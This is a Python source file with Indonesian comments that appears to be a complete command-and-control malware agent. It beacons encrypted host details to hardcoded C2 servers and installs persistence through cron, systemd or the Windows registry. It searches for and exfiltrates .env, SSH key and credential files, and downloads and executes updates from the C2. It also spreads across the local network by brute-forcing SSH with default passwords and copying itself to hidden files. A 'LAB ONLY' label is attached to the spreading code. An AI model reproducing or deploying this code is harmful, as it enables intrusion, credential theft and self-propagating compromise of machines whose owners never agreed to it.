import requests
import time
import os
import random
import datetime
import base64
import json
import sys
import socket
import subprocess
import threading
import platform
import shutil

# === CONFIGURASI POWERFULL ===
C2_SERVERS = [
    "https://c2-sentinel-server-production.up.railway.app",  # Server C2 utama kamu
    "http://backup1.c2-sentinel.gq",
    "http://192.168.1.4:8000"
]

XOR_KEY = "sentinel"
KILLSWITCH_FILE = "/tmp/.killswitch"
LOG_FILE = "agent.log"
TELEGRAM_BOT_TOKEN = ""  # Isi jika mau notifikasi Telegram
TELEGRAM_CHAT_ID = ""    # Isi chat ID kamu

# Stealth & Delay Config
MIN_BEACON_DELAY = 30
MAX_BEACON_DELAY = 120
STEALTH_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
]

# Auto-create log
open(LOG_FILE, "a").close()

def log(msg):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    full_msg = f"[{timestamp}] {msg}"
    print(full_msg)
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(full_msg + "\n")
        # Kirim ke Telegram (jika diaktifkan)
        if TELEGRAM_BOT_TOKEN and ("Agent v4.0" in msg or "SWARM" in msg):
            send_telegram(f"📡 {msg}")
    except:
        pass

def send_telegram(text):
    if not TELEGRAM_BOT_TOKEN:
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": text,
            "parse_mode": "Markdown"
        }
        requests.post(url, data=data, timeout=5)
    except:
        pass

# === ENKRIPSI ===
def xor_encrypt(data, key=XOR_KEY):
    try:
        return base64.b64encode(
            ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data)).encode('utf-8')
        ).decode('utf-8')
    except Exception as e:
        log(f"[ENKRIPSI ERROR] {e}")
        return None

# === PERSISTENCE - CROSS PLATFORM ===
def install_persistence():
    try:
        system = platform.system()
        script = os.path.abspath(__file__)

        if system == "Linux" and "ANDROID" in platform.uname().release.upper():
            # Termux
            cron_job = f"@reboot python3 {script} &"
            with os.popen("crontab -l 2>/dev/null") as f:
                current = f.read()
            if script not in current:
                os.system(f"(crontab -l 2>/dev/null; echo '{cron_job}') | crontab - 2>/dev/null")
                log("[*] Persistence: Termux cron installed.")
        elif system == "Linux":
            # Systemd (Ubuntu/Debian)
            service_file = f"/etc/systemd/system/sentinel-agent.service"
            if not os.path.exists(service_file):
                with open("/tmp/sentinel-agent.service", "w") as f:
                    f.write(f"""[Unit]
Description=Sentinel Agent
After=network.target

[Service]
ExecStart={sys.executable} {script}
Restart=always
User={os.getlogin() if hasattr(os, 'getlogin') else 'root'}

[Install]
WantedBy=multi-user.target""")
                os.system(f"sudo mv /tmp/sentinel-agent.service {service_file}")
                os.system("sudo systemctl daemon-reload")
                os.system("sudo systemctl enable sentinel-agent.service")
                os.system("sudo systemctl start sentinel-agent.service")
                log("[*] Persistence: Systemd service installed.")
        elif system == "Windows":
            # Registry Run
            import winreg
            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "SentinelAgent", 0, winreg.REG_SZ, f'"{sys.executable}" "{script}"')
            log("[*] Persistence: Windows Registry installed.")
    except Exception as e:
        log(f"[!] Persistence error: {e}")

# === NETWORK & SYSTEM INTEL ===
def get_system_info():
    info = {
        "hostname": socket.gethostname(),
        "platform": platform.platform(),
        "processor": platform.processor(),
        "cwd": os.getcwd(),
        "user": os.getlogin() if hasattr(os, 'getlogin') else "unknown"
    }
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info["local_ip"] = s.getsockname()[0]
        s.close()
    except:
        info["local_ip"] = "unknown"
    return info

# === EXFIL MODULE ===
def do_exfil():
    log("[*] 📤 EXFIL: Mencari file sensitif...")
    targets = [".env", "config.json", "id_rsa", "credentials"]
    found = []
    for root, dirs, files in os.walk(".", topdown=True):
        if root.count(os.sep) > 3: continue
        for file in files:
            if any(file.endswith(t) or t in file for t in targets):
                path = os.path.join(root, file)
                try:
                    if os.path.getsize(path) < 1024 * 5:
                        with open(path, "r", encoding="utf-8", errors="ignore") as f:
                            content = f.read(512)
                        found.append({"path": path, "preview": content[:100]})
                        log(f"[+] EXFIL: Ditemukan {path}")
                except: continue
    return found

# === SCAN MODULE ===
def do_scan():
    log("[*] 🔍 SCAN: Mendeteksi layanan lokal...")
    open_ports = []
    common_ports = [22, 80, 443, 8000, 8080]
    for port in common_ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex(("127.0.0.1", port))
            if result == 0: open_ports.append(port)
            sock.close()
        except: continue
    log(f"[*] SCAN: Port terbuka: {open_ports}")
    return open_ports

# === SWARM PROPAGATION MODULE (LAB ONLY) ===
def propagate():
    """Scan & clone to other machines in local network"""
    log("[*] 🌐 SWARM: Memulai propagasi otomatis...")

    local_ip = get_system_info().get("local_ip", "127.0.0.1")
    if not local_ip.startswith(("192.168.", "10.", "172.16.")):
        log("[!] SWARM: Bukan jaringan privat. Batalkan propagasi.")
        return

    subnet = ".".join(local_ip.split(".")[:3]) + "."
    targets = []

    # Ping sweep
    for i in range(1, 255):
        ip = subnet + str(i)
        if ip == local_ip: continue
        try:
            subprocess.check_call(["ping", "-c", "1", "-W", "1", ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            targets.append(ip)
            log(f"[+] SWARM: Host aktif: {ip}")
        except: continue

    # SSH brute-force lemah
    weak_creds = [("root", "root"), ("pi", "raspberry"), ("admin", "admin")]

    for target in targets:
        for user, pwd in weak_creds:
            try:
                cmd = f"sshpass -p '{pwd}' ssh -o StrictHostKeyChecking=no {user}@{target} 'echo SWARM_CONNECTED'"
                result = subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
                if result.returncode == 0:
                    log(f"[+] SWARM: Akses ke {target} dengan {user}:{pwd}")
                    copy_agent_to_target(target, user, pwd)
                    break  # lanjut ke target berikutnya
            except Exception as e:
                continue

def copy_agent_to_target(ip, user, pwd):
    """Copy & jalankan agent di mesin target"""
    try:
        # Generate nama file random
        random_name = f"/tmp/.{random.randint(1000,9999)}-systemd.py"
        
        # Copy via scp
        scp_cmd = f"sshpass -p '{pwd}' scp {__file__} {user}@{ip}:{random_name}"
        subprocess.run(scp_cmd, shell=True, timeout=10)

        # Install persistence & jalankan
        ssh_cmd = f"sshpass -p '{pwd}' ssh {user}@{ip} 'chmod +x {random_name} && nohup python3 {random_name} > /dev/null 2>&1 &'"
        subprocess.run(ssh_cmd, shell=True, timeout=10)

        log(f"[+] SWARM: Agent baru lahir di {ip} sebagai {random_name}!")
        send_telegram(f"🦠 *SWARM ALERT*\nAgent baru lahir di `{ip}`\nFile: `{random_name}`")
    except Exception as e:
        log(f"[!] SWARM Gagal ke {ip}: {e}")

# === P2P COMMUNICATION MODULE ===
P2P_PORT = 9999

def p2p_listener():
    """Dengarkan pesan dari agent lain"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind(("", P2P_PORT))
    except:
        return  # port already in use

    while True:
        try:
            data, addr = sock.recvfrom(1024)
            msg = data.decode()
            if msg.startswith("SWARM_PING"):
                hostname = socket.gethostname()
                pid = os.getpid()
                response = f"SWARM_PONG|{hostname}|{pid}|{addr[0]}"
                sock.sendto(response.encode(), addr)
                log(f"[*] P2P: Terima ping dari {addr[0]}")
            elif msg.startswith("SWARM_PONG"):
                parts = msg.split("|")
                if len(parts) >= 4:
                    log(f"[*] P2P: Agent ditemukan → Host: {parts[1]}, PID: {parts[2]}, IP: {parts[3]}")
        except:
            pass

def p2p_broadcast():
    """Broadcast ke jaringan lokal — cari agent lain"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    msg = "SWARM_PING"
    try:
        sock.sendto(msg.encode(), ("<broadcast>", P2P_PORT))
        log("[*] P2P: Broadcast mencari agent lain...")
    except:
        pass

# === BEACON DENGAN INTEL LENGKAP ===
def beacon():
    system_info = get_system_info()
    data = {
        "id": f"agent-{os.getpid()}",
        "ip": "unknown",
        "system": system_info,
        "timestamp": datetime.datetime.now().isoformat(),
        "status": "beacon",
        "swarm": {
            "hostname": system_info.get("hostname", "unknown"),
            "local_ip": system_info.get("local_ip", "unknown")
        }
    }

    try:
        data['ip'] = requests.get("https://api.ipify.org", timeout=5).text
    except:
        pass

    encrypted = xor_encrypt(json.dumps(data, ensure_ascii=False))
    if not encrypted:
        log("[!] Gagal enkripsi. Skip beacon.")
        return False

    for c2 in C2_SERVERS:
        try:
            headers = {
                "User-Agent": random.choice(STEALTH_USER_AGENTS),
                "X-Forwarded-For": ".".join(map(str, (random.randint(1, 255) for _ in range(4))))
            }
            log(f"[*] 📡 Beacon ke: {c2}")
            r = requests.post(f"{c2}/beacon", data={"data": encrypted}, headers=headers, timeout=10)

            if r.status_code == 200:
                try:
                    cmd_data = r.json()
                    cmd = cmd_data.get("cmd", "idle")
                    log(f"[+] ✅ Perintah: '{cmd}' dari {c2}")

                    if cmd == "scan":
                        result = do_scan()
                        send_result_beacon(c2, "scan_result", {"ports": result})
                    elif cmd == "exfil":
                        result = do_exfil()
                        send_result_beacon(c2, "exfil_result", {"files": result})
                    elif cmd == "update":
                        download_update(c2)
                    elif cmd == "kill":
                        log("[!] 💀 Perintah kill diterima.")
                        return "kill"
                    elif cmd == "swarm_activate":
                        threading.Thread(target=propagate, daemon=True).start()
                    return True
                except Exception as e:
                    log(f"[!] Gagal eksekusi perintah: {e}")
                    return True
        except Exception as e:
            log(f"[!] Gagal ke {c2}: {e}")
            continue
    return False

def send_result_beacon(c2, result_type, result_data):
    data = {
        "id": f"agent-{os.getpid()}",
        "type": result_type,
        "data": result_data,
        "timestamp": datetime.datetime.now().isoformat()
    }
    encrypted = xor_encrypt(json.dumps(data, ensure_ascii=False))
    if encrypted:
        try:
            requests.post(f"{c2}/beacon", data={"data": encrypted}, timeout=5)
            log(f"[*] 📤 Hasil {result_type} dikirim.")
        except:
            pass

# === SELF UPDATE ===
def download_update(c2_base):
    try:
        log(f"[*] 🔄 Update dari: {c2_base}/update")
        r = requests.get(f"{c2_base}/update", timeout=10)
        if r.status_code == 200:
            backup = __file__ + ".bak"
            with open(__file__, "r", encoding="utf-8") as f:
                with open(backup, "w", encoding="utf-8") as b:
                    b.write(f.read())
            with open(__file__, "w", encoding="utf-8") as f:
                f.write(r.text)
            log("[+] ✅ Update sukses. Restart...")
            os.execv(sys.executable, [sys.executable, __file__])
    except Exception as e:
        log(f"[!] Gagal update: {e}")

# === MAIN ===
if __name__ == "__main__":
    log("========================================")
    log("🚀 AGENT v4.0 - OMNISWARM EDITION")
    log("========================================")

    if os.path.exists(KILLSWITCH_FILE):
        log("[!] 💀 Killswitch aktif. Keluar...")
        exit(0)

    # Install persistence
    install_persistence()

    # Start P2P listener
    threading.Thread(target=p2p_listener, daemon=True).start()

    # Broadcast ke agent lain
    p2p_broadcast()

    # Kirim notifikasi Telegram
    if TELEGRAM_BOT_TOKEN:
        hostname = socket.gethostname()
        local_ip = get_system_info().get("local_ip", "unknown")
        send_telegram(f"✅ *Agent v4.0 Online*\nID: `agent-{os.getpid()}`\nHost: `{hostname}`\nIP: `{local_ip}`")

    # Main loop
    while True:
        if os.path.exists(KILLSWITCH_FILE):
            log("[!] 💀 Killswitch terdeteksi. Matikan agent...")
            break

        try:
            result = beacon()
            if result == "kill":
                break

            # 10% chance untuk coba propagasi
            if random.randint(1, 10) == 1:
                threading.Thread(target=propagate, daemon=True).start()

            # 30% chance broadcast P2P
            if random.randint(1, 3) == 1:
                p2p_broadcast()

            sleep_time = random.randint(MIN_BEACON_DELAY, MAX_BEACON_DELAY)
            log(f"[*] 😴 Tidur {sleep_time} detik...")
            time.sleep(sleep_time)

        except KeyboardInterrupt:
            log("\n[!] ⚠️ Dihentikan manual. Bye!")
            break
        except Exception as e:
            log(f"[!] 💥 Error: {e}. Tunggu 15 detik...")
            time.sleep(15)